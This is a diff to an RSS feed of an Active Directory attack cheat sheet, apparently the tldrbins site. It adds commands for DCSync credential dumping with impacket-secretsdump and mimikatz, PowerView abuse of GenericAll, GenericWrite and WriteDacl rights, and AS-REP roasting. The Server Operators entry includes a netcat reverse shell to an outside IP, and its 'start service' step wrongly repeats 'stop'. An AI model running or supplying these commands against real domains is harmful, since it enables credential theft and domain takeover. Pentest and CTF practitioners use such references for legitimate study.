@@ -8,18 +8,53 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@active-driectory/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>AD Recycle Bin</title>
+      <link>https://tldrbins.github.io/ad_recycle_bin/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ad_recycle_bin/</guid>
+      <description> AD Recycle Bin import-module activedirectory # Query all deleted objects within domain Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects # Get all details for the deleted account (e.g. TempAdmin) Get-ADObject -filter { SAMAccountName -eq &amp;#34;TempAdmin&amp;#34; } -includeDeletedObjects -property * # Restore deleted account (Need to rename to avoid user exist) Restore-ADObject -Identity ObjectGUID -NewName &amp;#34;new_user&amp;#34; -TargetPath &amp;#34;CN=Users,DC=example,DC=com&amp;#34; </description>
+    </item>
+    <item>
       <title>Bloodhound</title>
       <link>https://tldrbins.github.io/bloodhound/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/bloodhound/</guid>
-      <description> sharphound.ps1 Download sharphound.ps1&#xA;# Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All </description>
+      <description> sharphound.ps1 Download sharphound.ps1&#xA;# Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All sharphound.exe .\SharpHound.exe -c all </description>
+    </item>
+    <item>
+      <title>GenericAll</title>
+      <link>https://tldrbins.github.io/genericall/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericall/</guid>
+      <description> Using PowerView.ps1 . .\PowerView.ps1 Authenticated # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity &amp;#34;Exchange Windows Permissions&amp;#34; -Members USER Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity &amp;#39;Exchange Windows Permissions&amp;#39; -Members USER -Credential $Cred </description>
+    </item>
+    <item>
+      <title>GenericWrite</title>
+      <link>https://tldrbins.github.io/genericwrite/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericwrite/</guid>
+      <description> Using PowerView.ps1 . .\PowerView.ps1 Add UF_DONT_REQUIRE_PREAUTH bit # Check target user Get-DomainUser user | ConvertFrom-UACValue Set-DomainObject -Identity user -XOR @{useraccountcontrol=4194304} -Verbose Get hash # In local linux machine impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10 </description>
     </item>
     <item>
       <title>GetChanges/GetChangesAll</title>
       <link>https://tldrbins.github.io/getchanges_getchangesall/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/getchanges_getchangesall/</guid>
-      <description> GetChanges/GetChangesAll DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc username:password@10.10.11.10 # With hashes impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10 </description>
+      <description> GetChanges/GetChangesAll DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc username:password@10.10.11.10 # With hashes impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10 Mimikatz (From Windows) .\mimikatz.exe &amp;#39;lsadump::dcsync /domain:EXAMPLE.COM /user:administrator&amp;#39; exit </description>
+    </item>
+    <item>
+      <title>Server Operators</title>
+      <link>https://tldrbins.github.io/server_operators/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/server_operators/</guid>
+      <description> Server Operators # Change a service path (e.g. browser) sc.exe config browser binPath= &amp;#34;C:\windows\tasks\nc.exe -e cmd.exe 10.10.14.10 443&amp;#34; # Stop service sc.exe stop browser # Start service sc.exe stop browser </description>
+    </item>
+    <item>
+      <title>WriteDacl</title>
+      <link>https://tldrbins.github.io/writedacl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writedacl/</guid>
+      <description> Add dcsync right to user . .\PowerView.ps1 Authenticated Add-DomainObjectAcl -PrincipalIdentity &amp;#39;USER&amp;#39; -TargetIdentity &amp;#39;EXAMPLE.COM\Domain Admins&amp;#39; -Rights DCSync Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Add-DomainObjectAcl -PrincipalIdentity &amp;#39;USER&amp;#39; -TargetIdentity &amp;#39;EXAMPLE.COM\Domain Admins&amp;#39; -Rights DCSync -Credential $Cred Dcsync attack impacket-secretsdump username:password@10.10.11.10 </description>
     </item>
   </channel>
 </rss>
